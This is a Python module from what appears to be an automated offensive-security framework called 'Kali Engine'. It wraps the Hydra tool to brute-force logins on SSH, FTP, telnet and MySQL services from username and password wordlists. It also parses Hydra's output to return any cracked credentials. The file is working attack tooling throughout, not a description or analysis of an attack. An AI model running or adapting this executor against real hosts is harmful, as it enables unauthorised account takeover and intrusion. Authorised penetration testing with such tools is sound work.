import logging
import subprocess
from typing import Any, Dict, List

logger = logging.getLogger("kali-engine.executor.bruteforce")


SUPPORTED_SERVICES = {"ssh", "ftp", "telnet", "mysql"}


def execute(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """
    Kali Engine executor: credential_bruteforce
    Executes a Hydra brute force attack and parses results.
    """

    try:
        host = parameters["host"]
        service = parameters["service"]
        port = parameters["port"]
        user_wordlist = parameters["user_wordlist"]
        password_wordlist = parameters["password_wordlist"]
        stop_on_success = parameters.get("stop_on_success", True)
    except KeyError as e:
        return {
            "status": "TECHNICAL_ERROR",
            "details": f"Missing required parameter: {e}",
            "artifact": None,
        }

    if service not in SUPPORTED_SERVICES:
        return {
            "status": "TECHNICAL_ERROR",
            "details": f"Service '{service}' not supported by Hydra",
            "artifact": None,
        }

    cmd = [
        "hydra",
        "-L",
        user_wordlist,
        "-P",
        password_wordlist,
        "-s",
        str(port),
    ]

    if stop_on_success:
        cmd.append("-f")

    cmd.extend([f"{service}://{host}"])

    logger.info(f"[BRUTEFORCE_EXECUTOR] Running: {' '.join(cmd)}")

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
        )
    except subprocess.TimeoutExpired:
        return {
            "status": "TECHNICAL_ERROR",
            "details": "Hydra execution timed out",
            "artifact": None,
        }
    except Exception as e:
        return {
            "status": "TECHNICAL_ERROR",
            "details": f"Hydra execution error: {e}",
            "artifact": None,
        }

    stdout = proc.stdout or ""
    stderr = proc.stderr or ""
    combined_output = (stdout + "\n" + stderr).strip()

    if proc.returncode not in (0, 255):
        return {
            "status": "TECHNICAL_ERROR",
            "details": stderr.strip() or "Hydra execution failed",
            "artifact": {
                "raw_output": combined_output,
            },
        }

    credentials = parse_hydra_output(combined_output)

    if credentials:
        return {
            "status": "SUCCESS",
            "details": "Valid credentials found",
            "artifact": {
                "credentials": credentials,
                "raw_output": combined_output,
            },
        }

    if "kex error" in combined_output or "no match for method" in combined_output:
        return {
            "status": "TECHNICAL_ERROR",
            "details": "SSH legacy crypto incompatible with Hydra",
            "artifact": {
                "raw_output": combined_output,
            },
        }

    return {
        "status": "FAILURE",
        "details": "No valid credentials found",
        "artifact": {
            "raw_output": combined_output,
        },
    }


def parse_hydra_output(output: str) -> List[Dict[str, str]]:
    """
    Parses Hydra output to extract credentials.
    """

    credentials = []

    for line in output.splitlines():
        # Example:
        # [22][ssh] host: 10.0.0.1   login: root   password: toor
        if "login:" in line and "password:" in line:
            try:
                parts = line.split()
                login_idx = parts.index("login:") + 1
                pass_idx = parts.index("password:") + 1

                credentials.append(
                    {
                        "username": parts[login_idx],
                        "password": parts[pass_idx],
                    }
                )
            except Exception:
                continue

    return credentials
